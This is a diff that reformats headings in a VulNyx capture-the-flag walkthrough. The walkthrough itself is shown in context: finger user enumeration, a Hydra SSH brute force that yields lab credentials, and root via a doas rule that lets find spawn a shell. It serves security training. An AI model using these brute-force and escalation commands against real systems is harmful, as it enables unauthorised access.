@@ -32,7 +32,7 @@ A VulNyx machine focused on user enumeration through the Finger service, SSH acc
 
 ---
 
-# 🔍 Network Discovery
+## 🔍 Network Discovery
 
 First, scan the local network to identify active hosts using `arp-scan`.
 
@@ -40,7 +40,7 @@ First, scan the local network to identify active hosts using `arp-scan`.
 sudo arp-scan --localnet
 ```
 
-## Result
+### Result
 
 ```text
 $ sudo arp-scan  --localnet               
@@ -69,9 +69,9 @@ The target machine IP address was identified as:
 
 ---
 
-# 🔎 Enumeration
+## 🔎 Enumeration
 
-## Nmap Scan
+### Nmap Scan
 
 Perform a full TCP port scan:
 
@@ -79,7 +79,7 @@ Perform a full TCP port scan:
 nmap -n -Pn -sSV -p- --min-rate 5000 192.168.29.93
 ```
 
-## Scan Results
+### Scan Results
 
 ```bash
 $ nmap -n -Pn -sVS  -p- --min-rate 5000  192.168.29.93
@@ -98,7 +98,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
 ```
 
-### Findings
+#### Findings
 - Port **22** → SSH
 - Port **79** → Finger Service
 - Port **80** → HTTP
@@ -107,11 +107,11 @@ The Finger service appeared particularly interesting because it can sometimes al
 
 ---
 
-# 🌐 Web Enumeration
+## 🌐 Web Enumeration
 
 Open port 80 in the browser.
 
-### Observation
+#### Observation
 <img width="1076" height="537" alt="Screenshot 2026-05-25 151857" src="https://github.com/user-attachments/assets/70324cf7-611d-436a-96f9-e6bae0206614" />
 
 The website displayed only the default Apache landing page.
@@ -120,7 +120,7 @@ No useful information was discovered.
 
 ---
 
-# 📂 Directory Enumeration
+## 📂 Directory Enumeration
 
 Use Gobuster to search for hidden directories:
 
@@ -129,7 +129,7 @@ gobuster dir -u http://192.168.29.93/ \
 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-## Result
+### Result
 
 ```text
 $ gobuster dir -u http://192.168.29.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -159,7 +159,7 @@ No additional directories or sensitive files were discovered.
 
 ---
 
-# 🔍 User Enumeration via Finger Service
+## 🔍 User Enumeration via Finger Service
 
 Use the `finger-user-enum` script from PentestMonkey to enumerate usernames through the Finger service.
 
@@ -167,7 +167,7 @@ Use the `finger-user-enum` script from PentestMonkey to enumerate usernames thro
 ./finger-user-enum.pl -U users.txt -t 192.168.29.93
 ```
 
-## Result
+### Result
 
 ```text
 $ ./finger-user-enum.pl -U users.txt -t 10.229.52.4  
@@ -193,7 +193,7 @@ adam@10.229.52.4: Login: adam  Name: adam..Directory: /home/adam Shell: /bin/bas
 
 ```
 
-### Important Finding
+#### Important Finding
 A valid username was identified:
 
 ```text
@@ -202,7 +202,7 @@ adam
 
 ---
 
-# 🔓 SSH Brute Force
+## 🔓 SSH Brute Force
 
 Use Hydra to brute-force the SSH password:
 
@@ -211,7 +211,7 @@ hydra -l adam -P /usr/share/wordlists/rockyou.txt \
 ssh://192.168.29.93
 ```
 
-## Result
+### Result
 
 ```text
 $ hydra -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.29.93
@@ -232,7 +232,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-20 02:52:
 
 ```
 
-### Valid Credentials
+#### Valid Credentials
 
 ```text
 Username: adam
@@ -241,7 +241,7 @@ Password: passion
 
 ---
 
-# 🖥 Initial Access
+## 🖥 Initial Access
 
 Login through SSH:
 
@@ -249,13 +249,13 @@ Login through SSH:
 ssh adam@192.168.29.93
 ```
 
-## Verification
+### Verification
 
 ```bash
 id ; whoami ; hostname
 ```
 
-## Result
+### Result
 
 ```bash
 $ ssh adam@192.168.29.93                  
@@ -284,7 +284,7 @@ Successfully gained access as user `adam`.
 
 ---
 
-# 🔍 SUID Enumeration
+## 🔍 SUID Enumeration
 
 Search for SUID binaries:
 
@@ -292,7 +292,7 @@ Search for SUID binaries:
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-## Result
+### Result
 
 ```text
 adam@fing:~$ find / -perm -u=s -type f 2>/dev/null
@@ -309,12 +309,12 @@ adam@fing:~$ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-### Important Finding
+#### Important Finding
 The `/usr/bin/doas` binary appeared particularly interesting.
 
 ---
 
-# ⚠️ Doas Configuration Analysis
+## ⚠️ Doas Configuration Analysis
 
 Check the `doas` configuration file:
 
@@ -322,19 +322,19 @@ Check the `doas` configuration file:
 cat /etc/doas.conf
 ```
 
-## Result
+### Result
 
 ```text
 adam@fing:~$ cat /etc/doas.conf 
 permit nopass keepenv adam as root cmd /usr/bin/find
 ```
 
-### Explanation
+#### Explanation
 The configuration allows user `adam` to execute `/usr/bin/find` as root without a password.
 
 ---
 
-# 🚀 Privilege Escalation
+## 🚀 Privilege Escalation
 
 Use `doas` with `find` to spawn a root shell:
 
@@ -342,7 +342,7 @@ Use `doas` with `find` to spawn a root shell:
 doas -u root /usr/bin/find . -exec /bin/sh \;
 ```
 
-## Result
+### Result
 
 ```text
 adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/sh \;
@@ -353,7 +353,7 @@ Successfully obtained a root shell.
 
 ---
 
-# 🔧 Upgrading to Interactive Shell
+## 🔧 Upgrading to Interactive Shell
 
 Spawn a fully interactive shell:
 
@@ -363,7 +363,7 @@ script /dev/null -c bash
 
 ---
 
-# 👑 Verification
+## 👑 Verification
 
 Check the current user:
 
@@ -371,7 +371,7 @@ Check the current user:
 id ; whoami ; hostname
 ```
 
-## Result
+### Result
 
 ```bash
 root@fing:/home/adam# id ; whoami ; hostname
@@ -384,15 +384,15 @@ Successfully escalated privileges to root.
 
 ---
 
-# 🏁 Flags
+## 🏁 Flags
 
-## Locate Flags
+### Locate Flags
 
 ```bash
 find / -type f -name root.txt -o -name user.txt 2>/dev/null
 ```
 
-## Result
+### Result
 
 ```text
 root@fing:~# find / -type f -name root.txt -o -name user.txt 2</dev/null
@@ -402,7 +402,7 @@ root@fing:~# find / -type f -name root.txt -o -name user.txt 2</dev/null
 
 ---
 
-# 📄 User Flag
+## 📄 User Flag
 
 ```bash
 cat /home/fing/user.txt
@@ -414,7 +414,7 @@ ff18a9aca2d1dac41a5c26**********
 
 ---
 
-# 👑 Root Flag
+## 👑 Root Flag
 
 ```bash
 cat /root/root.txt
@@ -426,7 +426,7 @@ cat /root/root.txt
 
 ---
 ---
-## 🔍 About `doas`
+### 🔍 About `doas`
 
 `doas` is a lightweight privilege escalation utility originally developed for OpenBSD as an alternative to `sudo`. It allows specific users to execute commands as another user, usually `root`, based on rules defined in the `/etc/doas.conf` configuration file.
 
@@ -449,7 +449,7 @@ Since the `find` binary supports command execution through the `-exec` option, i
 
 This misconfiguration allowed direct privilege escalation to the root user.
 ---
-# 🧾 Summary
+## 🧾 Summary
 
 | Phase | Technique |
 |------|-----------|
@@ -465,7 +465,7 @@ This misconfiguration allowed direct privilege escalation to the root user.
 
 
 
-# 🚀 Key Takeaways
+## 🚀 Key Takeaways
 
 - The Finger service can leak valid usernames.
 - Weak SSH passwords remain a critical security risk.
